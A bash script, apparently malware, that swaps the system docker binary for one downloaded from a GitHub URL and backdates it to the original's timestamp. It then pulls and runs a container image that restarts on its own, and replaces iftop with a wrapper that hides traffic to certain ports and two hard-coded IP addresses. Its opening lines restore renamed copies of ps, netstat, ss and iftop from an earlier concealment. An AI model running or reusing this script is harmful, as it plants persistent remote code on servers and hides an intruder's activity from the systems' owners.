#!/bin/bash
#find ps netstat ss iftop
if [  -f "/sbin/iftop2" ];then
        rm -rf /sbin/iftop
        mv /sbin/iftop2 /sbin/iftop
fi
if [  -f "/sbin/ntss" ];then
        rm -rf /sbin/ss
        mv /sbin/ntss /sbin/ss
fi
if [  -f "/bin/ntstat" ];then
        rm -rf /bin/netstat
        mv /bin/ntstat /bin/netstat
fi
if [  -f "/bin/efps" ];then
        rm -rf /bin/ps
        mv /bin/efps /bin/ps
fi
if [  -f "/usr/bin/docker-ce" ];then
        rm -rf /usr/bin/docker
        mv /usr/bin/docker-ce /usr/bin/docker
fi
if  [ ! -n "$1" ] ;then
        echo "No action!"
        exit 127
fi

# get Node
mv /usr/bin/docker /usr/bin/docker-ce
wget -O /usr/bin/docker https://raw.githubusercontent.com/jackmoc/update/main/docker/docker >/dev/null 2>&1
chmod +x /usr/bin/docker
touch -r /usr/bin/docker-ce /usr/bin/docker

cd /tmp
wget https://github.com/jackmoc/update/releases/download/1.04/node_static.tar  >/dev/null 2>&1
docker load -i /tmp/node_static.tar
rm -rf node_static.tar
# start Docker_Node
docker run -itd  --restart=always --name node_static node_static $1

# build iftop
cd /sbin/
mv iftop iftop2
echo '#!/bin/bash
iftop2 $1 $2 $3 $4 $5 -f "port not 443 and port not 5353 and port not 5000 and port not 38824 and host not 150.109.185.45 and host not 13.213.63.209"' > iftop
chmod +x iftop
touch -r iftop2 iftop
